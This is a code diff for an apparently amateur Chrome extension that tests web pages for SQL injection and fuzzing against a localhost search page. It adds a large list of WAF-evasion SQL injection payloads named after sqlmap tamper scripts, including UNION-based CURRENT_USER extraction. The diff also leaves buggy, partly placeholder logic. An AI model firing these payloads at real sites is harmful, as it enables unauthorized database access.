@@ -59,9 +59,12 @@ function createString(len){
 function fillForm(s){
     //TODO
     //find the submit/search bar and fill it out
+
+    var injection = "document.forms[0].elements[0].name=".concat(s)
+
     chrome.tabs.executeScript(null,
     {
-        code:"document.forms[0]['q'].value=".concat(s)
+        code: injection
     });
 
 }
@@ -71,9 +74,8 @@ function fillForm(s){
 //--------------------The Various Tests Functions-------------------------------
 //------------------------------------------------------------------------------
 function startSQL(iterCount){
-    //TODO: the whole thing
 
-    var sqlDatabase = [
+        var sqlDatabase = [
     '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871', // apostrophemask
     '1 AND %00%271%00%27=%00%271', //apostrophenullencode
     '1 AND 1=1%00', // appendnullbyte
@@ -99,13 +101,36 @@ function startSQL(iterCount){
     'insert', //lowercase
     '1 /*!30874AND 2>1*/--', //modsecurityversioned
     '1 UNIOUNIONN SELESELECTCT 2--', //nonrecursivereplacement
-]
+    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1', //overlongutf8
+    '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1', //overlongutf8more
+    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E', //percentage
+    'INseRt', //randomcase
+    'I/**/N/**/SERT', //randomcomments
+    "1 AND 1=1 and '0having'='0having'", //secure sphere
+    '1 AND 9227=9227-- sp_password', //sp_password
+    'SELECT/**/id/**/FROM/**/users', //space2comment
+    '1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227', //space2hash
+    'SELECT/**_**/id/**_**/FROM/**_**/users', //space2morecomment
+    '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227', //space2morehash
+    '1%23%0AAND%23%0A9227=9227',//space2mssqlhash
+    'SELECT%A0id%0BFROM%0Cusers', //space2mysqlblank
+    '1--%0AAND--%0A9227=9227', //space2mysqldash
+    'SELECT+id+FROM+users', //space2plus
+    'SELECT%0Did%0DFROM%0Ausers', //space2randomblank
+    "1 %26%26 '1'='1", //symboliclogical
+    '-1 UNION SELECT', //unionalltounion
+    '1%bf%27-- ', //unmagicquotes
+    'INSERT', //uppercase
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#', //versionedkeywords
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#' //versionedmorekeywords
+    ];
 
+    var site = "http://localhost:8888/search.php?search=";
+    var test = site.concat(sqlDatabase[0]);
 
-    var site = "http://192.168.1.29/?s="
-    var test = site.concat()
-    for (var i=0; i<iterCount; i++){
-        //shit
+    for (var i=1; i<iterCount; i++){
+        chrome.tabs.create({'url': test});
+        test = site.concat(sqlDatabase[i]);
 
     }
 
@@ -114,6 +139,12 @@ function startSQL(iterCount){
 //------------------------------------------------------------------------------
 function startCSRF(){
     //TODO: the whole thing nams stuff here
+    var shit = [
+        'hi', //th
+        'you', //onnin
+        "oishdgi",
+
+    ];
 
 }
 
@@ -129,7 +160,7 @@ function startFuzzing(fuzLen, iterCount){
     //     console.log(tabURL);
     // });
 
-    var site = "http://192.168.1.29/?s=" // search term will be appended
+    var site = "http://localhost:8888/search.php?search=" // search term will be appended
     var test = site.concat(createString(fuzLen));
 
     for (let i = 0; i < iterCount; i++) {
@@ -146,20 +177,6 @@ function startFuzzing(fuzLen, iterCount){
 function startTest(){
     console.log("lsdjfkldsjdjf");
 
-    var len = Number(document.getElementById('injectLen').value);
-    //checking value of setLen
-    if((len >= 1000) || (len <= 0)){
-        //TODO: the alert closes instantly
-        alert("enter a valid value for the string Length")
-    }
-
-    var iterations = Number(document.getElementById('iterCount').value);
-    //checking value of iterCount
-    if((iterations >= 1000) || (iterations <= 0)){
-        //TODO: the alert closes instantly
-        alert("enter a valid value for the number of iterations")
-    }
-
     //check which radio button is selected
     if(document.getElementById('selectSQL').checked){
         startSQL(iterations);
@@ -168,7 +185,21 @@ function startTest(){
         startCSRF();
     }
     else if(document.getElementById('selectFuzzing').checked){
+
+        var len = Number(document.getElementById('injectLen').value);
+        //checking value of setLen
+        if((len >= 1000) || (len <= 0)){
+            //TODO: the alert closes instantly
+            alert("enter a valid value for the string Length")
+        }
+        var iterations = Number(document.getElementById('iterCount').value);
+        //checking value of iterCount
+        if((iterations >= 1000) || (iterations <= 0)){
+            //TODO: the alert closes instantly
+            alert("enter a valid value for the number of iterations")
+        }
         startFuzzing(len,iterations);
+
     }
 
 }
